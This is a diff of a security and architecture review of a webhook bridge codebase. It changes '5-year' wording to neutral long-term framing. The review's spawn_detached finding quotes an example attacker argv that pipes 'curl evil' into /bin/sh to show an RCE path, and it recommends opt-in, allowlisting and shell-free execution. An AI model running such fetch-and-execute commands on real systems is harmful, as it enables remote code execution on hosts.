@@ -1,14 +1,14 @@
-# agent-webhook-bridge — 5-Year Architecture Review
+# agent-webhook-bridge — Architecture Review
 
 - **Date:** 2026-05-31
 - **Reviewed at:** `agent-webhook-bridge-dev` @ v0.17.0 + DL-008 (branch `feat/channel-token-path`)
 - **Method:** three independent adversarial reviewers, one lens each (scalability/extensibility, maintainability, security), grounded in the actual code (file:line evidence required).
 - **Addendum:** backwards compatibility is **not** required (pre-1.0, single-operator) — breaking restructures are in-scope where the new structure is worth it.
-- **Framing:** "plan to maintain and grow this project for the next 5 years."
+- **Framing:** "plan to maintain and grow this project over the long term."
 
 ## Verdict
 
-A genuinely well-built, deliberately-small codebase (~4.4k LOC app, ~4k LOC tests, 232 test methods). The synchronous in-request model (DL-001) is **correctly right-sized** and should not get a pre-built queue. Package boundaries, the DTO idiom, the HMAC/secret receiver, and the three-way failure contract are all sound. The findings below are about **seams drawn for v0.17 scale that calcify at 5-year scale** — all cheaper to redraw now (no backcompat) than later. Two themes dominate and recur across all three lenses:
+A genuinely well-built, deliberately-small codebase (~4.4k LOC app, ~4k LOC tests, 232 test methods). The synchronous in-request model (DL-001) is **correctly right-sized** and should not get a pre-built queue. Package boundaries, the DTO idiom, the HMAC/secret receiver, and the three-way failure contract are all sound. The findings below are about **seams drawn for v0.17 scale that calcify as the project grows** — all cheaper to redraw now (no backcompat) than later. Two themes dominate and recur across all three lenses:
 
 1. **The writeback inversion** (the planned GitHub-PR→card-move FR, [board 8 #2016]): the bridge is one-way today, and the *easy* implementation (just another best-effort `Handler`) is the *wrong* one on both reliability (silent drop) and security (attacker-influenced privileged write) grounds. Design the seam before the code.
 2. **Secrets + retention on a multi-tenant, append-only host**: DL-008's 0600 reasoning isn't applied to the higher-value secrets; and the inbox/event store has no rotation/retention and an O(file) hot-path dedup that breaks on *calendar time*.
@@ -39,7 +39,7 @@ DL-008 enforces `mode & 0o077 == 0` on the channel token — but the two **highe
 ### B-3. `spawn_detached` — make it opt-in + executable-allowlisted + shell-free (Security M2)
 > **✅ Addressed (2026-05-31): DL-011.** Opt-in (`BRIDGE_SPAWN_ENABLED`, default off — `HandlerRegistry` doesn't register it otherwise); `cmd[0]` must be in `BRIDGE_SPAWN_ALLOWLIST` (absolute paths); execution is shell-free (`proc_open` argv + `setsid -f`, no `/bin/sh`). cwd/env are proc_open params.
 
-`HandlerRegistry` registers `spawn_detached` unconditionally (`:28`); it runs `exec(setsid <argv> … &)`. The "cmd is operator-authored, not webhook data" guarantee is a **convention, not an invariant** — `docs/customization.md` invites custom classifiers, and the natural `ReactionTarget::make(handler:'spawn_detached', payload:$payload)` passthrough hands an attacker the argv. `escapeshellarg` stops metachar breakout but not *which program runs* (`cmd:["/bin/sh","-c","curl evil|sh"]`). Highest-blast-radius surface (RCE as install user on a shared box); over 5 years P(some operator wires a passthrough classifier) → 1.
+`HandlerRegistry` registers `spawn_detached` unconditionally (`:28`); it runs `exec(setsid <argv> … &)`. The "cmd is operator-authored, not webhook data" guarantee is a **convention, not an invariant** — `docs/customization.md` invites custom classifiers, and the natural `ReactionTarget::make(handler:'spawn_detached', payload:$payload)` passthrough hands an attacker the argv. `escapeshellarg` stops metachar breakout but not *which program runs* (`cmd:["/bin/sh","-c","curl evil|sh"]`). Highest-blast-radius surface (RCE as install user on a shared box); over a long-enough horizon P(some operator wires a passthrough classifier) → 1.
 **Fix:** (1) don't register by default — explicit per-install opt-in; (2) `config('bridge.spawn_allowlist')` of absolute program paths, reject `cmd[0]` not in it; (3) drop the shell — `proc_open` with an argv array + `posix_setsid`, no `cd && env` shell string.
 
 ### B-4. Retention/rotation + bounded inbox dedup — this breaks on calendar time, not load (Scalability M1 + M3)
@@ -90,12 +90,12 @@ No queue (DL-001); `dedupCreate` + `UNIQUE(delivery_id)` idempotency; no `DB::tr
 
 ---
 
-## Top bets for the next 5 years (synthesized)
+## Top bets (synthesized)
 
 1. **Draw the durable-reaction + writeback-authz seam now, while writeback is still hypothetical (B-1).** Two-way-ness should enter as a contract extension, not a treatment-C + confused-deputy violation. This is the one finding all three lenses raised.
-2. **Build retention/rotation + secret-perms unification (B-4 + B-2).** The two things a 5-year append-only, multi-tenant system cannot lack: a prune story, and every secret held to the DL-008 0600 bar. Both are zero-contract-change and break-on-calendar-time if skipped.
-3. **Make `spawn_detached` safe-by-default + mechanize doc-sync (B-3 + B-5).** The only RCE path goes default-off + allowlisted; the onboarding map stops being able to silently rot. Each protects the thing a careful single operator can't sustain by discipline alone over 5 years.
+2. **Build retention/rotation + secret-perms unification (B-4 + B-2).** The two things a long-lived append-only, multi-tenant system cannot lack: a prune story, and every secret held to the DL-008 0600 bar. Both are zero-contract-change and break-on-calendar-time if skipped.
+3. **Make `spawn_detached` safe-by-default + mechanize doc-sync (B-3 + B-5).** The only RCE path goes default-off + allowlisted; the onboarding map stops being able to silently rot. Each protects the thing a careful single operator can't sustain by discipline alone over time.
 
 ---
 
-*Full per-lens reports (scalability / maintainability / security) were produced by three independent reviewers; this document is the synthesized, deduplicated, prioritized result. Backlog items derived from this review are tracked on kanban board 8 (bridge), tagged `5yr-review`.*
+*Full per-lens reports (scalability / maintainability / security) were produced by three independent reviewers; this document is the synthesized, deduplicated, prioritized result. Backlog items derived from this review are tracked on kanban board 8 (bridge), tagged `architecture-review`.*
